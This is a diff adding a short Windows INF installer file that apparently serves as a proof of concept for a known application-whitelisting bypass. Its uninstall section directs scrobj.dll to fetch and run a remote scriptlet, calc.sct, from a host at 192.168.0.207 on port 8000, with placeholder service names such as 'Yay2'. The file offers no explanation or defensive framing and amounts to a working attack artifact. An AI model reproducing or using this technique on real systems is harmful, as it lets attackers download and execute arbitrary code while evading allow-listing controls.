@@ -1,0 +1,14 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,http://192.168.0.207:8000/calc.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay2"
+ShortSvcName="Yay2"
